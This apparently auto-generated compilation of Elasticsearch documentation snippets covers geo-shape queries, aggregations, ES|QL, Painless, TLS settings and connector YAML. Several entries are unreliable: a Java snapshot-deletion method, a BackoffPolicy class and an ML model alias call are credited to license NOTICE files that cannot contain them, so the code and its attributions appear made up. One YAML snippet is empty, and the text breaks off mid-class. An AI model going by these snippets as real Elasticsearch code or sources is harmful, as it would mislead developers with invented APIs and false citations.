`shapes` index and the `location` path. This allows querying based on a shape that has been pre-defined and stored in Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-geo-shape-query.md#2025-04-21_snippet_8\n\nLANGUAGE: console\nCODE:\n```\nGET /example/_search\n{\n  \"query\": {\n    \"bool\": {\n      \"filter\": {\n        \"geo_shape\": {\n          \"location\": {\n            \"indexed_shape\": {\n              \"index\": \"shapes\",\n              \"id\": \"deu\",\n              \"path\": \"location\"\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Computing Minimum Price using Min Aggregation in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to use the Min aggregation to compute the minimum price value across all documents in an Elasticsearch index.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-min-aggregation.md#2025-04-22_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search?size=0\n{\n  \"aggs\": {\n    \"min_price\": { \"min\": { \"field\": \"price\" } }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Pagination with After Key in Elasticsearch Aggregation\nDESCRIPTION: Shows how to implement pagination in composite aggregations using size parameter and after_key.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-composite-aggregation.md#2025-04-21_snippet_16\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"my_buckets\": {\n      \"composite\": {\n        \"size\": 2,\n        \"sources\": [\n          { \"date\": { \"date_histogram\": { \"field\": \"timestamp\", \"calendar_interval\": \"1d\" } } },\n          { \"product\": { \"terms\": { \"field\": \"product\" } } }\n        ]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Installing Elasticsearch Plugin from Local File System (Windows)\nDESCRIPTION: This command installs an Elasticsearch plugin from a local file system location on Windows systems. Paths with spaces must be wrapped in quotes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/plugin-management-custom-url.md#2025-04-21_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nbin\\elasticsearch-plugin install file:///C:/path/to/plugin.zip\n```\n\n----------------------------------------\n\nTITLE: Basic Cartesian Centroid Aggregation\nDESCRIPTION: Demonstrates a simple cartesian_centroid aggregation that computes the centroid of all museum locations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-cartesian-centroid-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /museums/_search?size=0\n{\n  \"aggs\": {\n    \"centroid\": {\n      \"cartesian_centroid\": {\n        \"field\": \"location\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Geographical Distance with ST_DISTANCE in ESQL\nDESCRIPTION: This ESQL query filters for the Copenhagen airport (abbrev=\"CPH\"), calculates the distance between the airport location and city center using ST_DISTANCE function, and returns selected fields including the calculated distance.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/st_distance.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM airports\n| WHERE abbrev == \"CPH\"\n| EVAL distance = ST_DISTANCE(location, city_location)\n| KEEP abbrev, name, location, city_location, distance\n```\n\n----------------------------------------\n\nTITLE: Advanced Sync Rules: Filtered Employee Records\nDESCRIPTION: Sync rules that fetch only employee records where emp_id is greater than 5, applying a WHERE filter before syncing to Elasticsearch\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-ms-sql.md#2025-04-21_snippet_5\n\nLANGUAGE: js\nCODE:\n```\n[\n  {\n    \"tables\": [\"employee\"],\n    \"query\": \"SELECT * FROM employee WHERE emp_id > 5\"\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: Configuring ICU Normalization in Elasticsearch Index Settings\nDESCRIPTION: Example showing how to configure ICU normalization character filters in Elasticsearch index settings. Demonstrates both default NFKC_CF normalization and custom NFD normalization with decomposition mode.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-icu-normalization-charfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT icu_sample\n{\n  \"settings\": {\n    \"index\": {\n      \"analysis\": {\n        \"analyzer\": {\n          \"nfkc_cf_normalized\": { \n            \"tokenizer\": \"icu_tokenizer\",\n            \"char_filter\": [\n              \"icu_normalizer\"\n            ]\n          },\n          \"nfd_normalized\": { \n            \"tokenizer\": \"icu_tokenizer\",\n            \"char_filter\": [\n              \"nfd_normalizer\"\n            ]\n          }\n        },\n        \"char_filter\": {\n          \"nfd_normalizer\": {\n            \"type\": \"icu_normalizer\",\n            \"name\": \"nfc\",\n            \"mode\": \"decompose\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Executing Intervals Query in ElasticSearch\nDESCRIPTION: This snippet demonstrates how to use the `intervals` query in ElasticSearch to return documents containing specified terms and sequences with defined order and proximity. The query includes parameters such as `match`, `max_gaps`, and `ordered` to control the sequence and proximity of matches.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-intervals-query.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST _search\n{\n  \"query\": {\n    \"intervals\" : {\n      \"my_text\" : {\n        \"all_of\" : {\n          \"ordered\" : true,\n          \"intervals\" : [\n            {\n              \"match\" : {\n                \"query\" : \"my favorite food\",\n                \"max_gaps\" : 0,\n                \"ordered\" : true\n              }\n            },\n            {\n              \"any_of\" : {\n                \"intervals\" : [\n                  { \"match\" : { \"query\" : \"hot water\" } },\n                  { \"match\" : { \"query\" : \"cold porridge\" } }\n                ]\n              }\n            }\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring SSL Properties for SAML Realm\nDESCRIPTION: Configuration settings for SSL/TLS in SAML realm including key paths, passwords, certificate settings, keystore configurations, truststore settings, and SSL protocol options. These settings are specifically used for loading IdP metadata over HTTPS.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_14\n\nLANGUAGE: yaml\nCODE:\n```\nssl.key: \"/path/to/private.key\"\nssl.key_passphrase: \"password\"\nssl.secure_key_passphrase: \"secure_password\"\nssl.certificate: \"/path/to/certificate.pem\"\nssl.certificate_authorities: [\"/path/to/ca.pem\"]\nssl.keystore.path: \"/path/to/keystore.jks\"\nssl.keystore.type: \"jks\"\nssl.keystore.password: \"keystore_password\"\nssl.keystore.secure_password: \"secure_keystore_password\"\nssl.keystore.key_password: \"key_password\"\nssl.keystore.secure_key_password: \"secure_key_password\"\nssl.truststore.path: \"/path/to/truststore.jks\"\nssl.truststore.type: \"jks\"\nssl.truststore.password: \"truststore_password\"\nssl.truststore.secure_password: \"secure_truststore_password\"\nssl.verification_mode: \"full\"\nssl.supported_protocols: [\"TLSv1.3\", \"TLSv1.2\", \"TLSv1.1\"]\nssl.cipher_suites: [\"TLS_AES_256_GCM_SHA384\", \"TLS_AES_128_GCM_SHA256\"]\n```\n\n----------------------------------------\n\nTITLE: Complete Bucket Script Aggregation Query in Elasticsearch\nDESCRIPTION: A complete Elasticsearch query demonstrating how to implement a bucket script aggregation. It calculates the spread between minimum and maximum costs plus a base amount across different theaters, showing how buckets_path maps aggregation results into script parameters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-bucket-script-agg-context.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\nGET /seats/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"theatres\": {\n      \"terms\": {\n        \"field\": \"theatre\",\n        \"size\": 10\n      },\n      \"aggs\": {\n        \"min_cost\": {\n          \"min\": {\n            \"field\": \"cost\"\n          }\n        },\n        \"max_cost\": {\n          \"max\": {\n            \"field\": \"cost\"\n          }\n        },\n        \"spread_plus_base\": {\n          \"bucket_script\": {\n            \"buckets_path\": { <1>\n              \"min\": \"min_cost\",\n              \"max\": \"max_cost\"\n            },\n            \"script\": {\n              \"params\": {\n                \"base_cost\": 5 <2>\n              },\n              \"source\": \"(params.max - params.min) + params.base_cost\"\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Dynamic Type Casting to Target Types in Painless\nDESCRIPTION: Illustrates valid dynamic type casts from `def` to other types like `int`, `float`, and `List` in Painless, emphasizing the implicit casting behavior and when explicit casts are needed. It also showcases how the type represented by `def` can change.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-casting.md#2025-04-21_snippet_6\n\nLANGUAGE: painless\nCODE:\n```\ndef d = 1.0;         <1>\nint i = (int)d;      <2>\nd = 1;               <3>\nfloat f = d;         <4>\nd = new ArrayList(); <5>\nList l = d;          <6>\n```\n\n----------------------------------------\n\nTITLE: Configuring Remote Cluster Server TLS/SSL Settings\nDESCRIPTION: These YAML configuration options control TLS/SSL settings for the remote cluster server, including enabling SSL, supported protocols, client authentication, and cipher suites.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_30\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.remote_cluster_server.ssl.enabled: \nxpack.security.remote_cluster_server.ssl.supported_protocols: \nxpack.security.remote_cluster_server.ssl.client_authentication: \nxpack.security.remote_cluster_server.ssl.verification_mode: \nxpack.security.remote_cluster_server.ssl.cipher_suites: \n```\n\n----------------------------------------\n\nTITLE: Sample Docker Configuration for GitHub Connector\nDESCRIPTION: An example yaml configuration file snippet for Docker deployment where Elasticsearch and Kibana run as Dockerized versions, including essential settings like host and API key.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-github.md#2025-04-21_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\n\n```\n\n----------------------------------------\n\nTITLE: Explicit Type Casting Query in ESQL\nDESCRIPTION: Example query showing explicit type casting using to_datetime() function to convert a string date literal before using it in a date_diff calculation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-implicit-casting.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| EVAL dd_ns1=date_diff(\"day\", to_datetime(\"2023-12-02T11:00:00.00Z\"), birth_date)\n| SORT emp_no\n| KEEP dd_ns1\n| LIMIT 1\n```\n\n----------------------------------------\n\nTITLE: Deleting Old Snapshots in Elasticsearch Repository\nDESCRIPTION: This method deletes snapshots older than a specified timestamp from an Elasticsearch repository. It handles pagination and retries failed deletions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/inference/licenses/slf4j-NOTICE.txt#2025-04-22_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\npublic void deleteOldSnapshots(\n        String repoName,\n        long beforeTimestamp,\n        int batchSize,\n        ActionListener<DeleteSnapshotResult> listener\n    ) {\n        if (batchSize <= 0) {\n            throw new IllegalArgumentException(\"batchSize must be greater than 0\");\n        }\n        final AtomicBoolean hasMore = new AtomicBoolean(true);\n        final AtomicReference<String> lastSeenName = new AtomicReference<>();\n        final AtomicInteger deleted = new AtomicInteger();\n        final AtomicInteger failed = new AtomicInteger();\n\n        final ActionListener<DeleteSnapshotResult> wrappedListener = ActionListener.wrap(r -> {\n            if (failed.get() > 0) {\n                listener.onFailure(\n                    new SnapshotException(\n                        repoName,\n                        \"_all\",\n                        \"failed to delete [\" + failed.get() + \"] snapshots; successfully deleted [\" + deleted.get() + \"] snapshots\"\n                    )\n                );\n            } else {\n                listener.onResponse(r);\n            }\n        }, listener::onFailure);\n\n        deleteOldSnapshotsLoop(repoName, beforeTimestamp, batchSize, hasMore, lastSeenName, deleted, failed, wrappedListener);\n    }\n```\n\n----------------------------------------\n\nTITLE: Customizing N-gram Filter with Specific Parameters\nDESCRIPTION: Creates a custom index with a modified ngram filter that generates n-grams between 3-5 characters and increases the max_ngram_diff setting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-ngram-tokenfilter.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT ngram_custom_example\n{\n  \"settings\": {\n    \"index\": {\n      \"max_ngram_diff\": 2\n    },\n    \"analysis\": {\n      \"analyzer\": {\n        \"default\": {\n          \"tokenizer\": \"whitespace\",\n          \"filter\": [ \"3_5_grams\" ]\n        }\n      },\n      \"filter\": {\n        \"3_5_grams\": {\n          \"type\": \"ngram\",\n          \"min_gram\": 3,\n          \"max_gram\": 5\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Service Token Authentication\nDESCRIPTION: Example of using the bearer token for authentication in a curl request.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/service-tokens-command.md#2025-04-21_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ncurl -H \"Authorization: Bearer AAEAAWVsYXN0aWM...vZmxlZXQtc2VydmVyL3Rva2VuMTo3TFdaSDZ\" http://localhost:9200/_cluster/health\n```\n\n----------------------------------------\n\nTITLE: Creating an Index with Sparse Vector Field Mapping in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to create an Elasticsearch index with a sparse_vector field mapping. This is the field type that should be used with ELSER mappings for semantic search implementations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/sparse-vector.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index\n{\n  \"mappings\": {\n    \"properties\": {\n      \"text.tokens\": {\n        \"type\": \"sparse_vector\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining a Version Field in Elasticsearch Mapping\nDESCRIPTION: This snippet demonstrates how to create an index with a mapping that includes a 'version' field type. It shows the basic structure for defining a 'version' field named 'my_version' within the index mapping.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/version.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"my_version\": {\n        \"type\": \"version\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Number of Actors in Painless for Elasticsearch\nDESCRIPTION: This script calculates the number of actors by getting the size of the 'actors' field, which is stored as a keyword array.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-field-context.md#2025-04-21_snippet_1\n\nLANGUAGE: painless\nCODE:\n```\ndoc['actors'].size()\n```\n\n----------------------------------------\n\nTITLE: Connector Configuration YAML\nDESCRIPTION: Sample YAML configuration for setting up the Azure Blob Storage connector with Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-azure-blob.md#2025-04-21_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nelasticsearch.host: http://host.docker.internal:9200\nelasticsearch.api_key: <ELASTICSEARCH_API_KEY>\n\nconnectors:\n  -\n    connector_id: <CONNECTOR_ID_FROM_KIBANA>\n    service_type: azure_blob_storage\n    api_key: <CONNECTOR_API_KEY_FROM_KIBANA>\n```\n\n----------------------------------------\n\nTITLE: Configuring Concurrent Shard Recoveries in Elasticsearch YAML\nDESCRIPTION: These YAML snippets show settings for controlling concurrent shard recoveries, including incoming, outgoing, and total recoveries per node.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/cluster-level-shard-allocation-routing-settings.md#2025-04-21_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\ncluster.routing.allocation.node_concurrent_incoming_recoveries\n```\n\nLANGUAGE: yaml\nCODE:\n```\ncluster.routing.allocation.node_concurrent_outgoing_recoveries\n```\n\nLANGUAGE: yaml\nCODE:\n```\ncluster.routing.allocation.node_concurrent_recoveries\n```\n\n----------------------------------------\n\nTITLE: Implementing Custom fromXContent Parsing with Version Compatibility\nDESCRIPTION: Advanced example of custom parsing logic in the fromXContent method that handles version compatibility. Demonstrates checking field names against a ParseField and conditionally processing based on the REST API version.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/REST_API_COMPATIBILITY.md#2025-04-21_snippet_5\n\nLANGUAGE: java\nCODE:\n```\nprivate static final ParseField limitField = new ParseField(\"maximum\", \"limit\").forRestApiVersion(RestApiVersion.equalTo(RestApiVersion.V_7));\n\n//call to fromXContent\nMyExample.fromXContent(XContentType.JSON.xContent().createParser(XContentParserConfiguration.EMPTY.withDeprecationHandler(LoggingDeprecationHandler.INSTANCE).withRestApiVersion(request.getRestApiVersion()), \" { \\\"limit\\\" : 99 }\"));\n\n//contents of a fromXContent\nwhile ((token = parser.nextToken()) != XContentParser.Token.END_OBJECT) {\n    if (token == XContentParser.Token.FIELD_NAME) {\n        currentFieldName = parser.currentName();\n    } else if (token.isValue()) {\n        if (limitField.match(currentFieldName, LoggingDeprecationHandler.INSTANCE)) {\n            if (parser.getRestApiVersion().matches(RestApiVersion.onOrAfter(RestApiVersion.V_8))\n                && \"maximum\".equals(currentFieldName) == false) {\n                throw new IllegalArgumentException(\"invalid parameter [limit], use [maximum] instead\");\n            } else {\n                value = parser.intValue();\n            }\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Apache License 2.0 Boilerplate Template\nDESCRIPTION: Standard boilerplate notice for applying the Apache 2.0 License to software projects. Includes placeholders for copyright year and owner information, along with the standard license text and reference to the full license.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/SparseBitSet-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nCopyright [yyyy] [name of copyright owner]\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.\n```\n\n----------------------------------------\n\nTITLE: Sorting Multivalued Fields in ESQL\nDESCRIPTION: Demonstrates using mv_sort() to sort an array of numbers in both ascending and descending order. The function allows lexicographical sorting of multivalued fields with optional direction parameter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/mv_sort.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a = [4, 2, -3, 2]\n| EVAL sa = mv_sort(a), sd = mv_sort(a, \"DESC\")\n```\n\n----------------------------------------\n\nTITLE: Indexing Sample Data into Elasticsearch for Threat and Firewall Logs Using Console API\nDESCRIPTION: This snippet demonstrates using bulk POST requests to index sample documents into the 'threat_list' and 'firewall_logs' indices. The 'threat_list' index receives records of known malicious IP addresses with threat metadata, and the 'firewall_logs' index is populated with network traffic log entries. The bulk endpoint and newline-delimited JSON format improve indexing efficiency. This data setup is essential for testing the LOOKUP JOIN functionality.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-lookup-join.md#_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST threat_list/_bulk\n{\"index\":{}}\n{\"source.ip\":\"203.0.113.5\",\"threat_level\":\"high\",\"threat_type\":\"C2_SERVER\",\"last_updated\":\"2025-04-22\"}\n{\"index\":{}}\n{\"source.ip\":\"198.51.100.2\",\"threat_level\":\"medium\",\"threat_type\":\"SCANNER\",\"last_updated\":\"2025-04-23\"}\n```\n\nLANGUAGE: console\nCODE:\n```\nPOST firewall_logs/_bulk\n{\"index\":{}}\n{\"timestamp\":\"2025-04-23T10:00:01Z\",\"source.ip\":\"192.0.2.1\",\"destination.ip\":\"10.0.0.100\",\"action\":\"allow\",\"bytes_transferred\":1024}\n{\"index\":{}}\n{\"timestamp\":\"2025-04-23T10:00:05Z\",\"source.ip\":\"203.0.113.5\",\"destination.ip\":\"10.0.0.55\",\"action\":\"allow\",\"bytes_transferred\":2048}\n{\"index\":{}}\n{\"timestamp\":\"2025-04-23T10:00:08Z\",\"source.ip\":\"198.51.100.2\",\"destination.ip\":\"10.0.0.200\",\"action\":\"block\",\"bytes_transferred\":0}\n{\"index\":{}}\n{\"timestamp\":\"2025-04-23T10:00:15Z\",\"source.ip\":\"203.0.113.5\",\"destination.ip\":\"10.0.0.44\",\"action\":\"allow\",\"bytes_transferred\":4096}\n{\"index\":{}}\n{\"timestamp\":\"2025-04-23T10:00:30Z\",\"source.ip\":\"192.0.2.1\",\"destination.ip\":\"10.0.0.100\",\"action\":\"allow\",\"bytes_transferred\":512}\n```\n\n----------------------------------------\n\nTITLE: Handling Duplicate Values in Keyword Fields\nDESCRIPTION: Shows how keyword fields remove duplicate values on write, and how ESQL sees this removal. The example includes creating an index with a keyword field, indexing documents with duplicate values, and querying the results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-multivalued-fields.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT /mv\n{\n  \"mappings\": {\n    \"properties\": {\n      \"b\": {\"type\": \"keyword\"}\n    }\n  }\n}\n\nPOST /mv/_bulk?refresh\n{ \"index\" : {} }\n{ \"a\": 1, \"b\": [\"foo\", \"foo\", \"bar\"] }\n{ \"index\" : {} }\n{ \"a\": 2, \"b\": [\"bar\", \"bar\"] }\n\nPOST /_query\n{\n  \"query\": \"FROM mv | LIMIT 2\"\n}\n```\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"took\": 28,\n  \"is_partial\": false,\n  \"columns\": [\n    { \"name\": \"a\", \"type\": \"long\"},\n    { \"name\": \"b\", \"type\": \"keyword\"}\n  ],\n  \"values\": [\n    [1, [\"bar\", \"foo\"]],\n    [2,          \"bar\"]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Up a Prebuilt ML Model in Elasticsearch\nDESCRIPTION: API call to create a trained model alias for a prebuilt ML model. This example uses a language identification model, including model ID and alias for reference.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-gcs/licenses/google-api-services-storage-NOTICE.txt#2025-04-21_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nPOST _ml/trained_models/lang_ident_model_1/trained_model_aliases/lang_ident_model\n{\n  \"model_id\": \"lang_ident_model_1\"\n}\n```\n\n----------------------------------------\n\nTITLE: Initializing and Using String Types in Painless\nDESCRIPTION: Demonstrates different ways to create and use String types in Painless, including string literals and the new instance operator.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-types.md#2025-04-22_snippet_7\n\nLANGUAGE: painless\nCODE:\n```\nString r = \"some text\";             \nString s = 'some text';             \nString t = new String(\"some text\"); \nString u;                           \n```\n\n----------------------------------------\n\nTITLE: Configuring Force Merge Action in ILM Policy\nDESCRIPTION: This snippet demonstrates how to configure a force merge action in an Elasticsearch ILM policy. It sets up a policy named 'my_policy' with a force merge action in the warm phase, specifying to merge the index into a single segment.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-lifecycle-actions/ilm-forcemerge.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nPUT _ilm/policy/my_policy\n{\n  \"policy\": {\n    \"phases\": {\n      \"warm\": {\n        \"actions\": {\n          \"forcemerge\" : {\n            \"max_num_segments\": 1\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Combining MAX with MV_AVG Function in ESQL\nDESCRIPTION: Advanced example showing how to combine MAX with MV_AVG to first average multi-valued columns and then find the maximum. This query calculates the maximum of the average 'salary_change' values across all employees.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/max.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| STATS max_avg_salary_change = MAX(MV_AVG(salary_change))\n```\n\n----------------------------------------\n\nTITLE: Using IN Operator in Elasticsearch SQL\nDESCRIPTION: Demonstrates the IN operator which tests if a value matches any value in a list. This example selects last_name where emp_no is in the specified list of values (10000, 10001, 10002, 999).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-operators.md#2025-04-21_snippet_7\n\nLANGUAGE: sql\nCODE:\n```\nSELECT last_name l FROM \"test_emp\" WHERE emp_no IN (10000, 10001, 10002, 999) ORDER BY emp_no LIMIT 5;\n```\n\n----------------------------------------\n\nTITLE: Example of TRUNCATE Function with Negative Precision\nDESCRIPTION: Demonstrates using TRUNCATE with a negative precision value (-1), which truncates to the nearest 10 toward zero (-340 instead of -345.153).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-math.md#2025-04-21_snippet_34\n\nLANGUAGE: sql\nCODE:\n```\nSELECT TRUNCATE(-345.153, -1) AS trimmed;\n\n    trimmed\n---------------\n-340.0\n```\n\n----------------------------------------\n\nTITLE: Index Of Function - Case-Insensitive Elasticsearch Query\nDESCRIPTION: This script checks the index position of 'A' within `user_name` beyond index 2, without case sensitivity. Utilizes Elasticsearch's scripting capabilities for comparison.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/eql/src/test/resources/querytranslator_tests.txt#2025-04-21_snippet_12\n\nLANGUAGE: Elasticsearch Painless\nCODE:\n```\nscript\":{\"source\":\"InternalEqlScriptUtils.multiValueDocValues(doc,params.v0,X0->InternalQlScriptUtils.nullSafeFilter(InternalQlScriptUtils.gt(InternalEqlScriptUtils.indexOf(X0,params.v1,params.v2,params.v3),params.v4)))\",\"params\":{\"v0\":\"user_name\",\"v1\":\"A\",\"v2\":2,\"v3\":true,\"v4\":0}}\n```\n\n----------------------------------------\n\nTITLE: MAD (Median Absolute Deviation) Aggregation Function in SQL\nDESCRIPTION: Measures the variability of input values in a numeric field. Returns a double value representing the median absolute deviation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-aggs.md#2025-04-21_snippet_10\n\nLANGUAGE: sql\nCODE:\n```\nSELECT MIN(salary) AS min, MAX(salary) AS max, AVG(salary) AS avg, MAD(salary) AS mad FROM emp;\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT MIN(salary / 12.0) AS min, MAX(salary / 12.0) AS max, AVG(salary/ 12.0) AS avg, MAD(salary / 12.0) AS mad FROM emp;\n```\n\n----------------------------------------\n\nTITLE: Implementing Exponential Backoff Policy in Java for Elasticsearch\nDESCRIPTION: This code implements an exponential backoff policy with configurable parameters. It provides methods to wait for specific periods between retry attempts, with support for both synchronous and asynchronous execution via the TimeValue class.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/security/licenses/slf4j-nop-NOTICE.txt#2025-04-21_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\n/**\n * A policy to compute backoff delays for an operation that is retried.\n */\npublic class BackoffPolicy {\n\n    public static class Builder {\n\n        static final BackoffPolicy DEFAULT_BACKOFF = new BackoffPolicy(\n            CancellableBackoff.between(TimeValue.timeValueMillis(10), TimeValue.timeValueMinutes(1)),\n            // not needed as no sniffing used in this context, see #waitForNextRetry\n            retryOn -> true\n        );\n\n        private Cancellable backoff;\n        private Predicate<Exception> retryPredicate;\n\n        private Builder() {\n        }\n\n        /**\n         * Sets the backoff to be used\n         */\n        public Builder withBackoff(Cancellable backoff) {\n            this.backoff = backoff;\n            return this;\n        }\n\n        /**\n         * Sets whether to retry based on the exception thrown\n         */\n        public Builder withRetryOn(Predicate<Exception> retryPredicate) {\n            this.retryPredicate = retryPredicate;\n            return this;\n        }\n\n        /**\n         * Builds a new {@link BackoffPolicy}\n         */\n        public BackoffPolicy build() {\n            return new BackoffPolicy(this.backoff, this.retryPredicate);\n        }\n    }\n\n    /**\n     * Creates a new {@link Builder}\n     */\n    public static Builder builder() {\n        return new Builder();\n    }\n\n    private final Cancellable backoff;\n    private final Predicate<Exception> retryPredicate;\n\n    private BackoffPolicy(Cancellable backoff, Predicate<Exception> retryPredicate) {\n        this.backoff = backoff;\n        this.retryPredicate = retryPredicate;\n    }\n\n    /**\n     * Get default exponential backoff policy using jitter\n     */\n    public static BackoffPolicy exponentialBackoff() {\n        return BackoffPolicy.Builder.DEFAULT_BACKOFF;\n    }\n\n    /**\n     * Returns true if this policy should retry given the exception.\n     */\n    public boolean shouldRetry(Exception e) {\n        return retryPredicate.test(e);\n    }\n\n    /**\n     * Waits for the next delay before retrying the operation. A retry attempt is stored in {@code retryState}\n     * which is passed in to every invocation of this method. This method uses the backoff to compute the next delay and\n     * sleeps for the appropriate amount of time.\n     *\n     * @param retryState the retry state used to compute the delay\n     * @throws Exception propagates exceptions if the interrupts or cancels the waiting\n     */\n    public void waitForNextRetry(RetryState retryState) throws Exception {\n        TimeValue waitTime = backoff.next(retryState);\n        Thread.sleep(waitTime.millis());\n    }\n\n    /**\n     * Returns the iteration state which can be used in {@link #iterator()}\n     */\n    public RetryState newRetryState() {\n        return new RetryState();\n    }\n\n    /**\n     * Allows to iterate over the backoff delays. Uses {@link RetryState} internally.\n     */\n    public Iterator<TimeValue> iterator() {\n        return new BackoffIterator(newRetryState());\n    }\n\n    /**\n     * Allows to iterate over the backoff delays. Uses {@link RetryState} internally.\n     */\n    public final class BackoffIterator implements 